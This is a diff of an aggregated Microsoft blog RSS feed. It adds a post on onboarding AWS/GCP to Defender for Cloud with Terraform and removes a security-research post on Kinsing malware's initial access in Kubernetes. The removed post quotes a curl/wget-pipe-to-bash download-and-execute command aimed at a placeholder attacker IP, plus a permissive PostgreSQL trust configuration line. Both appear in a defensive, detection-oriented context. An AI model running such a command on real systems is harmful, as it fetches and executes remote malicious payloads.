@@ -3,7 +3,116 @@
     <title>Aggregated Microsoft Blog Feed</title>
     <link>https://hitem.github.io/rss-aggregator/aggregated_feed.xml</link>
     <description>An aggregated feed of Microsoft blogs</description>
-    <lastBuildDate>Tue, 18 Apr 2023 14:07:49 GMT</lastBuildDate>
+    <lastBuildDate>Tue, 18 Apr 2023 15:09:08 GMT</lastBuildDate>
+    <item>
+      <title>Onboarding your AWS/GCP environment to Microsoft Defender for Cloud with Terraform</title>
+      <link>https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/onboarding-your-aws-gcp-environment-to-microsoft-defender-for/ba-p/3798664</link>
+      <pubDate>Tue, 18 Apr 2023 14:37:58 GMT</pubDate>
+      <guid isPermaLink="false">https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/onboarding-your-aws-gcp-environment-to-microsoft-defender-for/ba-p/3798664</guid>
+      <description>&lt;h3&gt;&lt;strong&gt;Objective&lt;/strong&gt;&amp;nbsp;&lt;/h3&gt;
+&lt;p&gt;The purpose of this article is to provide you with step-by-step guidance on how to use Terraform templates, to onboard your AWS/GCP environment to Microsoft Defender for Cloud. &lt;a href="https://www.terraform.io/" target="_blank"&gt;Terraform&lt;/a&gt; is an Infrastructure as Code (IaC) tool you can use to build, change, and version your public cloud infrastructure safely and efficiently. In addition to being a widely used tool, an advantage of using Terraform to onboard your environment to Defender for Cloud, is that you can use it for both AWS and GCP. &amp;nbsp;Using Terraform to onboard your AWS/GCP environment to Defender for Cloud, allows you to automate the onboarding process and integrate it into your existing processes.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;If you need to install Terraform, you can start at &lt;a href="https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli" target="_blank"&gt;https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli&lt;/a&gt;. Guidance on how to get started with Terraform in Defender for Cloud, you can start at &lt;a href="https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/deploy-microsoft-defender-for-cloud-via-terraform/ba-p/3563710" target="_blank"&gt;Deploy Microsoft Defender for Cloud via Terraform - Microsoft Community Hub&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;Introduction&amp;nbsp;&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;Have you ever asked yourself how to onboard your AWS or GCP environment to Defender for Cloud with Terraform? This article provides you with guidance on how to use Terraform templates that have already been created to onboard your AWS/GCP environment to Microsoft Defender for Cloud. By the time you finish reading this article you&#8217;ll learn how to accomplish the following scenarios:&lt;/p&gt;
+&lt;ul class="lia-list-style-type-circle"&gt;
+&lt;li&gt;&lt;strong&gt;1&lt;sup&gt;st&lt;/sup&gt; Scenario:&lt;/strong&gt; Imagine as a security admin in your organization, you want to onboard &lt;strong&gt;several&lt;/strong&gt; AWS accounts &lt;strong&gt;not grouped&lt;/strong&gt; under an AWS management account to Microsoft Defender for Cloud, using Terraform.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2&lt;sup&gt;nd&lt;/sup&gt; Scenario: &lt;/strong&gt;Imagine as a security admin in your organization, you want to onboard &lt;strong&gt;all&lt;/strong&gt; AWS accounts &lt;strong&gt;grouped&lt;/strong&gt; under an AWS management account to Microsoft Defender for Cloud, using Terraform.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;While these two scenarios mention AWS, to onboard GCP you can follow the same process. This article provides step-by-step guidance for both scenarios, starting with the first scenario.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;Scenarios&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;1. Scenario: Onboarding several AWS accounts not grouped under an AWS management account to Microsoft Defender for Cloud, using Terraform.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;By default, when you onboard your AWS/GCP environment at the management account-/organizational-level through the Azure portal, the security connectors that are created for each account/project are stored in the same resource group. Some organizations have requirements for security connectors to reside in different resource groups. You can use the Terraform templates provided to achieve this purpose.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;1.1 Prepare the cloud you want to onboard: &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Clone (or download) the Terraform templates available at &lt;a href="https://aka.ms/MDCTerraformTemplates" target="_blank"&gt;https://aka.ms/MDCTerraformTemplates&lt;/a&gt;. After you clone the Terraform templates there are three steps you need to do.&lt;/p&gt;
+&lt;ul class="lia-list-style-type-circle"&gt;
+&lt;li&gt;Decide whether you want to onboard AWS or GCP environment to Defender for Cloud. If you want to onboard your AWS environment, clone the templates located in the folder &#8216;AWS&#8217;. Similarly, if you want to onboard your GCP environment, clone the templates located in the folder &#8216;Local&#8217; under &#8216;GCP&#8217; folder .&lt;/li&gt;
+&lt;li&gt;After you clone the Terraform templates, create the variable files (.tfvars), containing the necessary variables. Most of the variables are provided in the templates you cloned. By default, all Defender for Cloud plans are enabled. Any parameter that can be changed in the UI onboarding process, can be changed in the Terraform templates as well.&lt;/li&gt;
+&lt;li&gt;After you create the variables file, specify to Terraform to use the variables file by providing Terraform with credentials for each account or project that you want to onboard. You can plan the process of creating the users and roles that you need using the following commands:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+terraform init \ 
+terraform plan &#8211;var-file &amp;lt;variable-file-name&amp;gt;.tfvars \ 
+terraform apply &#8211;var-file &amp;lt;variable-file-name&amp;gt;.tfvars
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;After these commands run, Terraform does the rest. You need to repeat this process for every account or project you want to onboard. This ensures that credentials are provided by you for each account or project that you want to onboard. You can use the same credentials for all AWS accounts that you wish to onboard. This provides Terraform with the necessary permissions to the resources in question.&lt;/p&gt;
+&lt;p&gt;&lt;span class="lia-inline-image-display-wrapper lia-image-align-inline" style="width: 744px;"&gt;&lt;img alt="BojanMagusic_0-1681826742019.png" height="405" src="https://techcommunity.microsoft.com/t5/image/serverpage/image-id/461523i2992940667441467/image-dimensions/744x405?v=v2" title="BojanMagusic_0-1681826742019.png" width="744" /&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;The Terraform templates you cloned, can integrate with existing CI/CD processes. If you need to onboard multiple accounts or projects you can also use CI/CD pipelines, to which you can add these Terraform templates to onboard your accounts or projects.&amp;nbsp;After you complete these three steps, your destination cloud is ready to be onboarded and you can proceed with the onboarding process on the Azure side.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;1.2 Prepare the Azure cloud: &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Now let&#8217;s go into the process of telling Azure that you&#8217;re ready to onboard these accounts/projects. Clone (or download) the Terraform templates located in the folder &#8216;Azure&#8217;, that are available at &lt;a href="https://aka.ms/MDCTerraformTemplates" target="_blank"&gt;https://aka.ms/MDCTerraformTemplates&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;You need to provide all the accounts/projects you want to onboard and provide Terraform the Azure credentials you want it to use, for creating the security connector. You can think of the security connector as the object that connects Defender for Cloud to AWS/GCP and checks if it has all the necessary permissions.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;You can create a single variables file to onboard multiple accounts/projects. After you provide everything that you want, you need to run the following commands:&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+terraform init \ 
+terraform plan &#8211;var-file &amp;lt;variable-file-name&amp;gt;.tfvars  \ 
+terraform apply &#8211;var-file &amp;lt;variable-file-name&amp;gt;.tfvars
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;After you run these commands, Terraform creates all the security connectors inside of the same resource group. This effectively allows you automate the onboarding process of your accounts, projects, and everything else.&lt;/p&gt;
+&lt;p&gt;&lt;span class="lia-inline-image-display-wrapper lia-image-align-inline" style="width: 749px;"&gt;&lt;img alt="BojanMagusic_1-1681826998362.png" height="417" src="https://techcommunity.microsoft.com/t5/image/serverpage/image-id/461524iE380838FC18C850A/image-dimensions/749x417?v=v2" title="BojanMagusic_1-1681826998362.png" width="749" /&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;Some organizations have requirements for security connectors to reside in different resource groups. You can achieve this by modifying the Terraform templates you cloned.&amp;nbsp;Now let's look at the second scenario.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2. Scenario: Onboarding all AWS accounts grouped under an AWS management account to Microsoft Defender for Cloud, using Terraform.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Have you ever asked yourself how you can onboard all AWS account under a AWS management account to Defender for Cloud using Terraform. You can achieve this scenario by performing the following actions.&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2.1 Prepare the cloud you want to onboard: &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Clone (or download) the Terraform templates available at&amp;nbsp;&lt;a href="https://aka.ms/MDCTerraformTemplates" target="_blank"&gt;https://aka.ms/MDCTerraformTemplates&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;After you clone the Terraform templates there are three steps you need to do:&lt;/p&gt;
+&lt;ul class="lia-list-style-type-circle"&gt;
+&lt;li&gt;Decide whether you want to onboard AWS or GCP environment to Defender for Cloud. If you want to onboard your AWS environment, clone the templates located in the folder &#8216;AWS&#8217;. Similarly, if you want to onboard your GCP environment, clone the templates located in the folder &#8216;Organizational&#8217; under &#8216;GCP&#8217; folder.&lt;/li&gt;
+&lt;li&gt;After you clone the Terraform templates, create the variable files (.tfvars), containing the necessary variables. Majority of the variables are provided in the templates you cloned. By default, all Defender for Cloud plans are enabled.&lt;/li&gt;
+&lt;li&gt;After you create the variables file, specify to Terraform to use the variables file by providing Terraform with credentials for each account or project that you want to onboard. You can plan the process of creating the users and roles that you need using the following commands:&lt;/li&gt;
+&lt;/ul&gt;
+terraform init \ 
+terraform plan &#8211;var-file &amp;lt;variable-file-name&amp;gt;.tfvars  \ 
+terraform apply &#8211;var-file &amp;lt;variable-file-name&amp;gt;.tfvars
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;span class="lia-inline-image-display-wrapper lia-image-align-inline" style="width: 745px;"&gt;&lt;img alt="BojanMagusic_2-1681827226818.png" height="405" src="https://techcommunity.microsoft.com/t5/image/serverpage/image-id/461526i302DCB504B3181D2/image-dimensions/745x405?v=v2" title="BojanMagusic_2-1681827226818.png" width="745" /&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;After you apply it, Terraform does the rest. You need to do this process only once to onboard all accounts/projects grouper under a management account or organization. The Terraform templates you cloned, can integrate with your existing CI/CD process.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;After you complete these three steps, your destination cloud is ready to be onboarded and you can proceed with the onboarding process on the Azure side.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2.2 Prepare the Azure cloud: &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Now let&#8217;s go into the process of telling Azure that you&#8217;re ready to onboard these accounts/projects. Clone (or download) the Terraform templates located in the folder &#8216;Azure&#8217; that are available at &lt;a href="https://aka.ms/MDCTerraformTemplates" target="_blank"&gt;https://aka.ms/MDCTerraformTemplates&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;You need to provide the management account/organization you want to onboard and you provide Terraform the Azure credentials you want it to create the security connector with. You can think of the security connector as the object that connects Defender for Cloud to AWS/GCP and checks if it has all the necessary permissions.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;You can create a single variables file to onboard accounts/projects below a management account/organization. After you provide everything that you want, you need to run the following commands:&lt;/p&gt;
+terraform init \ 
+terraform plan &#8211;var-file &amp;lt;variable-file-name&amp;gt;.tfvars  \ 
+terraform apply &#8211;var-file &amp;lt;variable-file-name&amp;gt;.tfvars
+&lt;p&gt;&lt;span class="lia-inline-image-display-wrapper lia-image-align-inline" style="width: 746px;"&gt;&lt;img alt="BojanMagusic_3-1681827226833.png" height="416" src="https://techcommunity.microsoft.com/t5/image/serverpage/image-id/461527iFA09948315CCEF16/image-dimensions/746x416?v=v2" title="BojanMagusic_3-1681827226833.png" width="746" /&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;After you run these commands, Terraform creates the security connector.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;If you need to validate in the UI that the security connector(s) has been successfully created, log-in to the Azure portal and navigate to the Defender for Cloud Dashboard. Then select Environment Settings. The page that opens should display the security connectors for the accounts/projects you onboarded with Terraform templates.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Terraform templates provide you with a flexible way to automate the onboarding process of your AWS/GCP environment. In addition to being a widely used tool, an advantage of using Terraform is that you can use it for both AWS and GCP, Additionally, you can integrate the Terraform templates covered in this article, with your existing CI/CD process.&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;h3&gt;Contributors&lt;/h3&gt;
+&lt;p&gt;Ilay Alog, Site Reliability Engineer II,&lt;/p&gt;
+&lt;p&gt;Tomer Hoter, Senior Site Reliability Engineer,&lt;/p&gt;
+&lt;p&gt;Omer Hasson,&amp;nbsp;Site Reliability Engineer&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;h3&gt;Reviewers&lt;/h3&gt;
+&lt;p&gt;Lior Arviv, Senior Product Manager,&lt;/p&gt;
+&lt;p&gt;Ilay Alog, Site Reliability Engineer II&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;</description>
+    </item>
     <item>
       <title>Entra Identity Governance with Entra Verified ID &#8211; Higher Fidelity Access Rights + Faster Onboarding</title>
       <link>https://techcommunity.microsoft.com/t5/microsoft-entra-azure-ad-blog/entra-identity-governance-with-entra-verified-id-higher-fidelity/ba-p/2466934</link>
@@ -12844,71 +12953,6 @@ AZFWNetworkRule
 &lt;li&gt;&lt;i&gt;&lt;span&gt;Join the conversation on &lt;/span&gt;&lt;/i&gt;&lt;a href="https://twitter.com/azuread/status/1278418103903363074" rel="noopener" target="_blank"&gt;&lt;i&gt;&lt;span&gt;Twitter&lt;/span&gt;&lt;/i&gt;&lt;/a&gt;&lt;i&gt;&lt;span&gt; and &lt;/span&gt;&lt;/i&gt;&lt;a href="https://www.linkedin.com/showcase/microsoft-security/" rel="noopener" target="_blank"&gt;&lt;i&gt;&lt;span&gt;LinkedIn&lt;/span&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;i&gt;&lt;span&gt;Share product suggestions on the &lt;/span&gt;&lt;/i&gt;&lt;a href="https://feedback.azure.com/d365community/forum/22920db1-ad25-ec11-b6e6-000d3a4f0789" rel="noopener" target="_blank"&gt;&lt;i&gt;&lt;span&gt;Entra (Azure AD) forum&lt;/span&gt;&lt;/i&gt;&lt;/a&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;
 &lt;/ul&gt;</description>
-    </item>
-    <item>
-      <title>Initial access techniques in Kubernetes environments used by Kinsing malware</title>
-      <link>https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/initial-access-techniques-in-kubernetes-environments-used-by/ba-p/3697975</link>
-      <pubDate>Thu, 05 Jan 2023 12:45:02 GMT</pubDate>
-      <guid isPermaLink="false">https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/initial-access-techniques-in-kubernetes-environments-used-by/ba-p/3697975</guid>
-      <description>&lt;p&gt;Sunders Bruskin, Security Researcher, Microsoft Defender for Cloud&lt;/p&gt;
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;&lt;u&gt;&lt;span&gt;Abstract&lt;/span&gt;&lt;/u&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;Kinsing is a known malware that targets Linux environments for cryptocurrency purposes. Kinsing uses some unique techniques that target containerized environments, making it also common in Kubernetes clusters. The evolving behavior of Kinsing has been analyzed in several different blog posts.&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;In this blog post, we will focus on a specific angle of Kinsing: the initial access techniques in Kubernetes environments. While Kinsing uses multiple initial access vector techniques, in Microsoft Defender for Cloud, we recently observed two methods that are especially common: Exploitation of weakly configured PostgreSQL containers and exploiting vulnerable images.&lt;br /&gt;We will discuss these methods and explain how organizations can detect and mitigate those threats.&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;&lt;u&gt;&lt;span&gt;Method 1: Vulnerable images&lt;/span&gt;&lt;/u&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;Through our threat hunting activity, we observed several images that are frequently infected with Kinsing malware. Many of those images were vulnerable to remote code execution, allowing attackers with network access to exploit the container and run their malicious payload.&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;A few examples of applications with vulnerable versions that were exploited are:&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;span&gt;PHPUnit &lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span&gt;Liferay&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span&gt;WebLogic&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span&gt;Wordpress&lt;/span&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;We will focus on a specific example: Oracle WebLogic exploitation.&amp;nbsp;&lt;/span&gt;&lt;span&gt;In 2020 Oracle disclosed a series of high severity vulnerabilities, allowing remote code execution (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14882" rel="noopener" target="_blank"&gt;CVE-2020-14882&lt;/a&gt;,&amp;nbsp;&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14750" rel="noopener" target="_blank"&gt;CVE-2020-14750&lt;/a&gt;, and&amp;nbsp;&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-14883" rel="noopener" target="_blank"&gt;CVE-2020-14883&lt;/a&gt;).&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;&lt;br /&gt;Recently, we identified a widespread campaign of Kinsing that targeted vulnerable versions of WebLogic servers.&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;Attacks start with scanning of a wide range of IP addresses, looking for an open port that matches the WebLogic default port (7001).&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;If vulnerable, attackers can use one of the exploits to run their malicious payload (Kinsing in this case). The main method we observed was running a malicious command with the following structure: &lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&#8220;/bin/bash -c (curl -s &lt;strong&gt;Attacker_IP&lt;/strong&gt;/&lt;strong&gt;Payload_Name&lt;/strong&gt;.sh||wget -q -O-&lt;strong&gt;Attacker_IP&lt;/strong&gt;/&lt;strong&gt;Payload_Name&lt;/strong&gt;.sh)|bash&#8221;&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Detection&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;In Microsoft Defender for Cloud, several alerts can identify dropping a payload on a container in case of exploitation. The alerts can identify suspicious downloads to the container as well as suspicious resources from which the file was downloaded.&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;Examples of such alerts:&lt;/span&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;A file was downloaded and executed&lt;/strong&gt;&lt;span&gt; &#8211; a file has been downloaded to the container, given execution privileges, and then executed.&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Behavior similar to common Linux bots detected&lt;/strong&gt;&lt;span&gt; &#8211; execution of a process associated with common Linux botnets. &lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Detected suspicious file download&lt;/strong&gt;&lt;span&gt; &#8211; can identify suspicious download of binaries that can pose a risk to the host.&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Suspicious download then run activity&lt;/strong&gt;&lt;span&gt; &#8211; looks for suspicious files that were downloaded and executed (common method of miners).&lt;/span&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Mitigations:&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;There are several ways to mitigate the risk of containers with vulnerable images.&lt;br /&gt;The first thing to note when deploying an image to the container is that it is an image from a known registry and it is patched with the latest version.&lt;br /&gt;Also, scan all images for vulnerabilities to identify which ones are vulnerable and what the vulnerabilities are, especially the ones that are used in exposed containers.&lt;br /&gt;It is also possible to mitigate the risk by minimizing access to the container, assigning access to specific IPs and applying the least privileges rule to the user.&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;&lt;u&gt;&lt;span&gt;Method 2: Exploitation of weakly configured PostgreSQL&lt;/span&gt;&lt;/u&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;The second method we observed to get initial access and run the malicious payload is a misconfigured and exposed PostgreSQL servers. Lately, we observed a large amount of clusters that were infected with Kinsing and ran a PostgreSQL container.&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;There are several misconfigurations that attackers can use to get access to a Postgres server if exposed:&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;The first misconfiguration is using &#8216;trust authentication&#8217; setting. According to PostgreSQL official site:&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;span&gt;&#8220;When&amp;nbsp;trust&amp;nbsp;authentication is specified,&amp;nbsp;PostgreSQL&amp;nbsp;assumes that anyone who can connect to the server is authorized to access the database with whatever database user name they specify (even superuser names)&#8221;&lt;/span&gt;&lt;/em&gt;&lt;span&gt;&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;To assign trust configuration on a specific IP address one needs to edit the &lt;em&gt;pg_hba.conf&lt;/em&gt; file, and add the following line: &lt;br /&gt;&lt;em&gt;&#8220;&lt;strong&gt;Host&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; all&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; all&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; [IP_Address/range]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; trust&lt;/strong&gt;&#8221;&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;In some cases, this range is wider than it should be or even accepts connections from any IP address (i.e. 0.0.0.0/0). In such configurations, attackers can freely connect to the Postgres servers without authentication, which may lead to code execution.&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;Also, some network configurations in Kubernetes are prone to ARP poisoning, allowing attackers to impersonate applications in the cluster. Therefore, even specifying a private IP address in the &#8220;trust&#8221; configuration may pose a security risk.&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;There are several methods to modify PostgreSQL container&#8217;s configuration, edit the &lt;em&gt;pg_hba.conf&lt;/em&gt; file directly or set environment variables that will modify the file (&lt;em&gt;POSTGRES_HOST_AUTH_METHOD&lt;/em&gt; variable).&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span&gt;In general, allowing access to a broad range of IP addresses is exposing the PostgreSQL container to a potential threat. Even if the unsecured &#8220;trust&#8221; authentication method isn&#8217;t used, and other methods are used instead, it can open attackers to several options such as brute force on the Postgresql accounts, attacking the container availability with DoS and DDoS attacks, and trying to exploit the container and the DB itself.&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p class="lia-align-left"&gt;&lt;span&gt;Microsoft Defender for Cloud identifies permissive settings and misconfigurations of PostgreSQL server containers that are exposed to the internet. In this way, an organization can mitigate the risk before the container get compromised.&lt;br /&gt;In addition, even if the configuration changes while the container is already running, we can monitor the changes and notify the customer about the change.&lt;/span&gt;&lt;/p&gt;
-&lt;p class="lia-align-left"&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p class="lia-align-left"&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p class="lia-align-center"&gt;&lt;span class="lia-inline-image-display-wrapper lia-image-align-inline" style="width: 956px;"&gt;&lt;img alt="Sunders_Bruskin_0-1671103234030.png" height="590" src="https://techcommunity.microsoft.com/t5/image/serverpage/image-id/426329i5A8F900ACF44E8A5/image-dimensions/956x590?v=v2" title="Sunders_Bruskin_0-1671103234030.png" width="956" /&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p class="lia-align-center"&gt;Figure 1: Microsoft Defender for Cloud Alert&lt;/p&gt;
-&lt;p class="lia-align-left"&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p class="lia-align-left"&gt;&lt;span&gt;In conclusion, we demonstrated two techniques that are commonly seen in real-world attacks on Kubernetes clusters: exploiting vulnerable images and leveraging excessive Internet exposure.&lt;br /&gt;Exposing the cluster to the Internet without proper security measures can leave it open to attack from external sources. In addition, attackers can gain access to the cluster by taking advantage of known vulnerabilities in images.&lt;br /&gt;It&#8217;s important for security teams to be aware of exposed containers and vulnerable images and try to mitigate the risk before they are breached. As we have seen in this blog, regularly updating images and secure configurations can be a game changer for a company when trying to be as protected as possible from security breaches and risky exposure.&lt;/span&gt;&lt;/p&gt;
-&lt;p class="lia-align-left"&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p&gt;&lt;span class="lia-inline-image-display-wrapper lia-image-align-center" style="width: 930px;"&gt;&lt;img alt="Sunders_Bruskin_0-1672910476226.png" height="714" src="https://techcommunity.microsoft.com/t5/image/serverpage/image-id/430372i3FA6F45B0C73C18A/image-dimensions/930x714?v=v2" title="Sunders_Bruskin_0-1672910476226.png" width="930" /&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p class="lia-align-center"&gt;&lt;span&gt;Figure 2: Kinsing initial access options and methods to mitigate them.&lt;/span&gt;&lt;/p&gt;
-&lt;p class="lia-align-center"&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;</description>
     </item>
     <item>
       <title>End user passwordless utopia</title>
